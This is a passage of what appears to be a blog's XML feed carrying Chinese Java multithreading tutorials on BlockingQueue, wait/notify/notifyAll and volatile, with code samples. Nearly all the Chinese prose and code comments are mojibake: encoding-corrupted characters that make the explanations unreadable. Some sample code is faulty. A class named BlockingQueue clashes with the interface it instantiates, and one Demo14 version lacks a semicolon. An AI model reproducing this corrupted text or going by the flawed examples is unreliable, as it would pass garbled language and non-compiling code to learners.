æ–¹æ³•ç”¨äºé˜»å¡å¼çš„å…¥é˜Ÿåˆ—, take ç”¨äºé˜»å¡å¼çš„å‡ºé˜Ÿåˆ—.<br>3.BlockingQueue ä¹Ÿæœ‰ offer, poll, peek ç­‰æ–¹æ³•, ä½†æ˜¯è¿™äº›æ–¹æ³•ä¸å¸¦æœ‰é˜»å¡ç‰¹æ€§.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlockingQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        BlockingQueue&lt;String&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//å…¥é˜Ÿåˆ—</span></span><br><span class="line">        queue.put(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//å‡ºé˜Ÿåˆ—.å¦‚æœæ²¡æœ‰putç›´æ¥take,ä¼šé˜»å¡.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">elem</span> <span class="operator">=</span> queue.take();</span><br><span class="line">        System.out.println(elem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x5_</title>
      <link href="/2024/09/08/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%94%E2%80%94%E2%80%94wait%E5%92%8Cnotify/"/>
      <url>/2024/09/08/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%94%E2%80%94%E2%80%94wait%E5%92%8Cnotify/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡äº”â€”â€”waitå’Œnotify"><a href="#å¤šçº¿ç¨‹ç¯‡äº”â€”â€”waitå’Œnotify" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡äº”â€”â€”waitå’Œnotify"></a>å¤šçº¿ç¨‹ç¯‡äº”â€”â€”waitå’Œnotify</h3><p>å¦‚ç¬”è€…ç†è§£æœ‰è¯¯,æ¬¢è¿äº¤æµæŒ‡æ­£â­</p><p>çº¿ç¨‹çš„æ‰§è¡Œå…ˆåé¡ºåºéš¾ä»¥é¢„æ–™ã€æŠ¢å å¼æ‰§è¡Œã€‘ï¼Œä½†æ˜¯å®é™…å¼€å‘ä¸­æˆ‘ä»¬ä¼šéœ€è¦æŒæ¡å½“ä¸‹çº¿ç¨‹çš„æ‰§è¡Œé¡ºåº.<br>è¿™å°±æ˜¯waitå’Œnotifyçš„ä½œç”¨.ã€éƒ½æ˜¯Objectæ–¹æ³•å³éšä¾¿å®šä¹‰ä¸€ä¸ªå¯¹è±¡è±†å¯ä»¥ä½¿ç”¨waitå’Œnotifyã€‘</p><h4 id="wait-æ–¹æ³•"><a href="#wait-æ–¹æ³•" class="headerlink" title="wait()æ–¹æ³•"></a>wait()æ–¹æ³•</h4><h5 id="waitæ‰§è¡Œè¿‡ç¨‹"><a href="#waitæ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="waitæ‰§è¡Œè¿‡ç¨‹"></a>waitæ‰§è¡Œè¿‡ç¨‹</h5><p>1.é‡Šæ”¾å½“å‰çš„é”<br>2.è®©çº¿ç¨‹è¿›å…¥é˜»å¡<br>3.å½“çº¿ç¨‹è¢«å”¤é†’çš„æ—¶å€™é‡æ–°è·å–åˆ°é”</p><p>ä¸Šä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">            object.wait();</span><br><span class="line">            System.out.println(<span class="string">&quot;end.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°waitä¸€ç›´å¤„äºç­‰å¾…çŠ¶æ€</p><p>1<br><strong>tips</strong><br><strong>waitæ­é…synchronizedä½¿ç”¨ï¼ŒsynchronizedåŠ é”ç»™å¯¹è±¡å¤´è¿›è¡Œæ ‡è®°</strong></p><h5 id="waitç»“æŸç­‰å¾…çš„æ¡ä»¶"><a href="#waitç»“æŸç­‰å¾…çš„æ¡ä»¶" class="headerlink" title="waitç»“æŸç­‰å¾…çš„æ¡ä»¶"></a>waitç»“æŸç­‰å¾…çš„æ¡ä»¶</h5><p>å…¶ä»–çº¿ç¨‹è°ƒç”¨è¯¥å¯¹è±¡çš„notifyæ–¹æ³•<br>waitç­‰å¾…è¶…æ—¶ï¼ˆtimeoutç”¨æ¥æŒ‡å®šç­‰å¾…æ—¶é—´ï¼‰<br>å…¶ä»–çº¿ç¨‹è°ƒç”¨è¯¥ç­‰å¾…çº¿ç¨‹çš„interruptedæ–¹æ³•ï¼ŒæŠ›å‡ºInterruptedExceptionå¼‚å¸¸</p><h5 id="waitå’Œsleepçš„å¯¹æ¯”"><a href="#waitå’Œsleepçš„å¯¹æ¯”" class="headerlink" title="waitå’Œsleepçš„å¯¹æ¯”"></a>waitå’Œsleepçš„å¯¹æ¯”</h5><h6 id="å…±åŒç‚¹"><a href="#å…±åŒç‚¹" class="headerlink" title="å…±åŒç‚¹"></a>å…±åŒç‚¹</h6><p>è®©çº¿ç¨‹åœ¨ä¸€æ®µæ—¶é—´é‡Œä¸æ‰§è¡Œ.ã€waitç”¨äºçº¿ç¨‹é—´é€šä¿¡(ç”Ÿäº§è€…-æ¶ˆè´¹è€…æ¨¡å‹) sleepç”¨äºçº¿ç¨‹é˜»å¡(å»¶è¿Ÿæ“ä½œ)ã€‘</p><h6 id="ä¸åŒç‚¹"><a href="#ä¸åŒç‚¹" class="headerlink" title="ä¸åŒç‚¹"></a>ä¸åŒç‚¹</h6><p>1.wait()å¯é€šè¿‡notify()å”¤é†’,sleep()é€šè¿‡Interrupt()å”¤é†’<br>2.ä½¿ç”¨wait()æ—¶æ²¡æœ‰è®¾ç½®æœ€å¤§ç­‰å¾…æ—¶é—´ï¼Œè€Œsleep()æ˜¯åœ¨çŸ¥é“æœ€å¤§æ—¶é™çš„æƒ…å†µä¸‹ä½¿ç”¨(é€šè¿‡å¼‚å¸¸å”¤é†’,è¯´æ˜ç¨‹åºåº”è¯¥æ˜¯å‡ºç°ç‰¹æ®Šæƒ…å†µäº†).<br>3.wait()æ­é…synchronizedä½¿ç”¨,sleep()ä¸ç”¨.<br>4.wait()æ˜¯Objectçš„æ–¹æ³•,sleep()æ˜¯Threadçš„é™æ€æ–¹æ³•.<br>5.wait()æ–¹æ³•ä¼šé‡Šæ”¾é”ï¼Œsleep()ä¸ä¼š.</p><h4 id="notify-æ–¹æ³•"><a href="#notify-æ–¹æ³•" class="headerlink" title="notify()æ–¹æ³•"></a>notify()æ–¹æ³•</h4><p>æ­¤æ—¶æˆ‘ä»¬çš„notify()æ–¹æ³•å°±æ‹…èµ·äº†<strong>å”¤é†’</strong>wait()æ–¹æ³•çš„å¤§ä»»(å”¤é†’ç­‰å¾…çš„çº¿ç¨‹).<br><strong>tips</strong><br>notify()è¦åœ¨åŒæ­¥æ–¹æ³•æˆ–åŒæ­¥å—ä¸­è°ƒç”¨.å®ƒä¼šé€šçŸ¥å¯èƒ½ç­‰å¾…è¯¥å¯¹è±¡å¯¹è±¡é”çš„å…¶ä»–çº¿ç¨‹ï¼Œä½¿å¾—å®ƒä»¬é‡æ–°è·å–å¯¹è±¡é”.<br>å¦‚æœæœ‰å¤šä¸ªçº¿ç¨‹ç­‰å¾…ï¼Œæœ‰çº¿ç¨‹è°ƒåº¦å™¨éšæœºæŒ‘é€‰ä¸€ä¸ªwaitçŠ¶æ€çš„çº¿ç¨‹[ã€æ— å…ˆæ¥ååˆ°ã€‘<br>è°ƒç”¨notify()æ–¹æ³•åä¸ä¼šç«‹å³é‡Šæ”¾å¯¹è±¡é”ï¼Œè¦ç­‰åˆ°æ‰§è¡Œnotify()æ–¹æ³•çš„çº¿ç¨‹å°†ç¨‹åºæ‰§è¡Œå®Œä¹‹åã€é€€å‡ºåŒæ­¥ä»£ç å—ã€‘æ‰ä¼šé‡Šæ”¾å¯¹è±¡é”.</p><h5 id="notifyå”¤é†’çº¿ç¨‹è¿‡ç¨‹"><a href="#notifyå”¤é†’çº¿ç¨‹è¿‡ç¨‹" class="headerlink" title="notifyå”¤é†’çº¿ç¨‹è¿‡ç¨‹"></a>notifyå”¤é†’çº¿ç¨‹è¿‡ç¨‹</h5><p>1.åˆ›å»º WaitTask ç±», å¯¹åº”ä¸€ä¸ªçº¿ç¨‹, run å†…éƒ¨å¾ªç¯è°ƒç”¨ wait.<br>2.åˆ›å»º NotifyTask ç±», å¯¹åº”å¦ä¸€ä¸ªçº¿ç¨‹, åœ¨ run å†…éƒ¨è°ƒç”¨ä¸€æ¬¡ notify æ³¨æ„, WaitTask å’Œ NotifyTask å†…éƒ¨æŒæœ‰åŒä¸€ä¸ª Object locker.<br>3.WaitTask å’Œ NotifyTask è¦æƒ³é…åˆ å°±éœ€è¦æ­é…åŒä¸€ä¸ª Object. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo16</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;t1 wait ä¹‹å‰&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">//t1æ‰§è¡Œåˆ°è¿™,å°±ä¼šå…ˆç«‹å³é‡Šæ”¾é”,è¿›å…¥waitæ–¹æ³•(é‡Šæ”¾é”+é˜»å¡ç­‰å¾…)</span></span><br><span class="line">                        locker.wait();</span><br><span class="line">                        System.out.println(<span class="string">&quot;t1 wait ä¹‹å&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">//t2æ‰§è¡Œèµ·æ¥ä¹‹å,å…ˆè¿›è¡Œsleep(3000)(è¿™ä¸ªsleepæ“ä½œå°±å¯ä»¥è®©t1å…ˆæ‹¿åˆ°é”)</span></span><br><span class="line">                    <span class="comment">//å¦‚æœå…ˆnotifyè™½ç„¶ä¸ä¼šæœ‰å‰¯ä½œç”¨(ä¸ä¼šå‡ºç°å¼‚å¸¸ä¹‹ç±»çš„),ä½†æ˜¯waitå°±æ— æ³•è¢«å”¤é†’,é€»è¾‘ä¸Šæœ‰é—®é¢˜</span></span><br><span class="line">                    Thread.sleep(<span class="number">3000</span>);</span><br><span class="line">                    <span class="comment">//t2sleepç»“æŸä¹‹å,ç”±äºt1æ˜¯waitçŠ¶æ€,t2å°±èƒ½æ‹¿åˆ°é”</span></span><br><span class="line">                    <span class="comment">//æ¥ä¸‹æ¥æ‰“å°t2notifyä¹‹å‰,æ‰§è¡Œnotifyæ“ä½œ,è¿™ä¸ªæ“ä½œå°±èƒ½å”¤é†’t1(æ­¤æ—¶t1å°±ä»WAITINGçŠ¶æ€æ¢å¤è¿‡æ¥äº†)</span></span><br><span class="line">                    <span class="keyword">synchronized</span> (locker) &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;t2 notify ä¹‹å‰&quot;</span>);</span><br><span class="line">                        locker.notify();</span><br><span class="line">                        <span class="comment">//ä½†æ˜¯ç”±äºt2æ­¤æ—¶è¿˜æ²¡æœ‰é‡Šæ”¾é”,WAITINGæ¢å¤ä¹‹å,å°è¯•è·å–é”,å°±å¯èƒ½å‡ºç°ä¸€ä¸ªå°å°çš„é˜»å¡,è¿™ä¸ªé˜»å¡æ˜¯ç”±é”ç«äº‰å¼•èµ·çš„</span></span><br><span class="line">                        <span class="comment">//t1ç›®å‰å¤„äºBLOCKEDçŠ¶æ€,ä½†æ˜¯æ—¶é—´æ¯”è¾ƒçŸ­,è‚‰çœ¼çœ‹ä¸è§</span></span><br><span class="line">                        System.out.println(<span class="string">&quot;t2 notify ä¹‹å&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//t2é‡Šæ”¾é”ä¹‹å,å°±å¯ä»¥ç»§ç»­æ‰§è¡Œt1</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="notifyAll-æ–¹æ³•"><a href="#notifyAll-æ–¹æ³•" class="headerlink" title="notifyAll()æ–¹æ³•"></a>notifyAll()æ–¹æ³•</h4><p>é¡¾åæ€ä¹‰å“ˆ notifyAll()å¯ä»¥å”¤é†’æ‰€æœ‰æ–¹æ³•&gt;<br><strong>æ³¨æ„</strong><br><strong>å”¤é†’çš„è¿™äº›æ–¹æ³•åœ¨ç­‰å¾…(wait)è¿”å›æ—¶é‡æ–°è·å–é”äº§ç”Ÿé”ç«äº‰ï¼Œä½†å®é™…è¿™äº›é”æ˜¯ä¸²è¡Œæ‰§è¡Œçš„ã€é”è¢«å“ªä¸ªçº¿ç¨‹å…ˆè·å–æ˜¯ä¸ç¡®å®šçš„ã€‘</strong></p><h6 id="åŒºåˆ«notify-å’ŒnotifyAll"><a href="#åŒºåˆ«notify-å’ŒnotifyAll" class="headerlink" title="åŒºåˆ«notify()å’ŒnotifyAll()"></a>åŒºåˆ«notify()å’ŒnotifyAll()</h6><p>1.å”¤é†’ä¸€ä¸ª&#x2F;éƒ½å”¤é†’<br>2.æ²¡æœ‰é”ç«äº‰&#x2F;äº§ç”Ÿé”ç«äº‰<br><strong>å¯¹æ¯”å¯å‘ç°notify()æ¯”notifyAll()å¥½æ§åˆ¶ å‘ç”Ÿé”™è¯¯çš„æ¦‚ç‡æ›´ä½</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x4_</title>
      <link href="/2024/09/07/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%9B%9B%E2%80%94%E2%80%94volatile%E5%85%B3%E9%94%AE%E5%AD%97/"/>
      <url>/2024/09/07/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%9B%9B%E2%80%94%E2%80%94volatile%E5%85%B3%E9%94%AE%E5%AD%97/</url>
      
        <content type="html"><![CDATA[<h3 id="å¤šçº¿ç¨‹ç¯‡å››â€”â€”volatileå…³é”®å­—"><a href="#å¤šçº¿ç¨‹ç¯‡å››â€”â€”volatileå…³é”®å­—" class="headerlink" title="å¤šçº¿ç¨‹ç¯‡å››â€”â€”volatileå…³é”®å­—"></a>å¤šçº¿ç¨‹ç¯‡å››â€”â€”volatileå…³é”®å­—</h3><p>å¦‚ç¬”è€…ç†è§£æœ‰è¯¯ï¼Œæ¬¢è¿äº¤æµæŒ‡æ­£â­</p><p>é¦–å…ˆæˆ‘ä»¬è¦æ˜æ™°çš„ä¸€ç‚¹æ˜¯<strong>è®¡ç®—æœºè¿è¡Œç¨‹åºæˆ–ä»£ç æ—¶ç»å¸¸è¦è®¿é—®æ•°æ®ï¼Œè¿™äº›ä¾èµ–çš„æ•°æ®å¾€å¾€å­˜å‚¨åœ¨å†…å­˜ä¸­.</strong><br><strong><u>CPUä½¿ç”¨å˜é‡çš„æ—¶å€™éœ€è¦å…ˆä»å†…å­˜ä¸­è¯»å–å‡ºæ¥æ”¾åˆ°CPUçš„å¯„å­˜å™¨ä¸­</u></strong>|ç”±æ­¤æˆ‘ä»¬å¯å¾—è¯»å†…å­˜æ¯”è¯»ç¡¬ç›˜å¿«ï¼Œè¯»å¯„å­˜å™¨æ¯”è¯»å†…å­˜å¿«ï¼Œä½†æ˜¯CPUä¸€æ—¦æ¶‰åŠè¯»&#x2F;å†™å†…å­˜é€Ÿç‡å¾ˆä½.æ­¤æ—¶æˆ‘ä»¬èªæ˜å¾—ç¼–è¯‘å™¨å°±ä¼šå¸®å¿™äº†ï¼ˆè™½ç„¶æœ‰æ—¶å€™ä¼šå¸®å€’å¿™) ç¼–è¯‘å™¨å¯èƒ½ä¼šå¯¹ä»£ç åšå‡ºä¼˜åŒ–ï¼Œå‡å°‘è¯»å†…å­˜çš„æ¬¡æ•°ã€‚æé«˜æ•´ä½“çš„æ•ˆç‡.</p><h4 id="volatileèƒ½ä¿è¯å†…å­˜å¯è§æ€§"><a href="#volatileèƒ½ä¿è¯å†…å­˜å¯è§æ€§" class="headerlink" title="volatileèƒ½ä¿è¯å†…å­˜å¯è§æ€§"></a>volatileèƒ½ä¿è¯å†…å­˜å¯è§æ€§</h4><p>ä¸Šä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo14</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span>(flg == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//å•¥ä¹Ÿæ²¡æœ‰</span></span><br><span class="line">            &#125;</span><br><span class="line">             System.out.println(<span class="string">&quot;game over!&quot;</span>)</span><br><span class="line">         &#125;);</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt; &#123;</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">                flg = sc.nextInt();</span><br><span class="line">        &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå‘ç°<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/04badabdd5665a1a271fea327c4a8cb7.png" alt="img"><br>å½“æˆ‘è¾“å…¥6çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰è¾“å‡ºâ€game over!â€ æŒ‰ç†æ¥è¯´ä¿®æ”¹flgçš„å€¼ä¸ä¸º0çš„æ—¶å€™ä¼šè¾“å‡ºâ€game over!â€ä¸ºä»€ä¹ˆä¼šå‡ºç°å¼‚å¸¸å‘¢ï¼Ÿ<br>è¿™å°±æ˜¯æˆ‘ä»¬çš„<strong>å†…å­˜å¯è§æ€§é—®é¢˜</strong>.<br>è¯»å–flgçš„å€¼è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºä¸¤æ­¥èµ°.</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.loadè¯»å–å†…å­˜ä¸­çš„flgå€¼åˆ°å¯„å­˜å™¨ä¸­.</span><br><span class="line"><span class="number">2</span>.é€šè¿‡cmpæŒ‡ä»¤æ¯”è¾ƒå™¨æ¯”è¾ƒç¼“å­˜å™¨çš„å€¼æ˜¯å¦ä¸º<span class="number">0</span>ï¼Œå†å†³å®šæ˜¯å¦è¦è¿›å…¥å¾ªç¯.</span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹è¿™ä¹ˆå¤„ç†ä¸ä¹Ÿæ²¡ä»€ä¹ˆé—®é¢˜ã€‚ä½†æ˜¯ï¼Œwhileå¾ªç¯æ­¤æ—¶é£é€Ÿè¿è½¬<strong>çŸ­æ—¶é—´</strong>å†…ä¼šè¿›è¡Œ<strong>å¤§é‡é‡å¤</strong>çš„æ“ä½œï¼Œè¿™æ ·å°±å‡ºç°äº†æœ€å¼€å¤´ä»‹ç»çš„å°èªæ˜ç¼–è¯‘å™¨.big èƒ†å°±æ°´çµçµä¼˜åŒ–ä¸Šäº†ğŸ˜€<br><strong>åªåœ¨ç¬¬ä¸€æ¬¡å¾ªç¯çš„æ—¶å€™è¯»å†…å­˜åç»­ç›´æ¥ä»å¯„å­˜å™¨ä¸­å–å‡ºæ•°æ®</strong><br><u>ç”±äºä¿®æ”¹flgæ˜¯t2çº¿ç¨‹ét1çº¿ç¨‹æœ¬èº«ï¼Œç¼–è¯‘å™¨æ²¡æœ‰æ­£ç¡®çš„åˆ¤å®šï¼ˆæé«˜æ•ˆç‡ä¸ä¿è¯é€»è¾‘ä¸å˜å“ˆï¼‰ä»¥ä¸ºflgæœªè¢«ä¿®æ”¹å°±ç›´æ¥å¯åŠ¨ä¼˜åŒ–äº†ï¼Œt1æ„Ÿå—ä¸åˆ°ä¿®æ”¹è¿‡åçš„flgçš„å†…å­˜å˜åŒ–</u><br>å¦‚ä½•é¿å…å°èªæ˜ä¸è¦å¸®å€’å¿™ï¼Ÿè¿™å°±éœ€è¦èªæ˜çš„ä½ ä½¿ç”¨volatileå…³é”®å­—æé†’ç¼–è¯‘å™¨.ã€å¼ºåˆ¶çˆ±è¯»å–å†…å­˜ã€‘<br><strong>è¢«volatileä¿®é¥°çš„å˜é‡çš„çš„è¯»å†™æ“ä½œç›¸å…³æŒ‡ä»¤,æ˜¯ä¸å¯ä»¥é‡æ’åºçš„.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo14</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">flg</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         <span class="type">Thread</span> <span class="variable">t1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">while</span>(flg == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//å•¥ä¹Ÿæ²¡æœ‰</span></span><br><span class="line">            &#125;</span><br><span class="line">             System.out.println(<span class="string">&quot;game over!&quot;</span>);</span><br><span class="line">         &#125;);</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt; &#123;</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">                flg = sc.nextInt();</span><br><span class="line">        &#125;);</span><br><span class="line">            t1.start();</span><br><span class="line">            t2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/04badabdd5665a1a271fea327c4a8cb7.png"></p><p>å½“ç„¶è§£å†³å†…å­˜å¯è§æ€§é—®é¢˜çš„æ–¹æ³•å‡ºäº†ä»æ ¹éƒ¨æŠ¹æ€(volatileå…³é”®å­—)è¿˜å¯ä»¥è§„é¿é—®é¢˜(sleepå»¶ç¼“å¼€é”€é€Ÿç‡ ä¼˜åŒ–ä¹Ÿæ²¡å¿…è¦è¿›è¡Œäº†)</p><h4 id="volatileä¸ä¿è¯åŸå­æ€§"><a href="#volatileä¸ä¿è¯åŸå­æ€§" class="headerlink" title="volatileä¸ä¿è¯åŸå­æ€§"></a>volatileä¸ä¿è¯åŸå­æ€§</h4><p><strong>volatile å’Œ synchronized æœ‰ç€æœ¬è´¨çš„åŒºåˆ«. synchronized èƒ½å¤Ÿä¿è¯åŸå­æ€§, volatile ä¿è¯çš„æ˜¯å†…å­˜å¯è§æ€§.</strong> </p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¤šçº¿ç¨‹_0x3_</title>
      <link href="/2024/09/06/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%89/"/>
      <url>/2024/09/06/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%B8%89/</url>
      
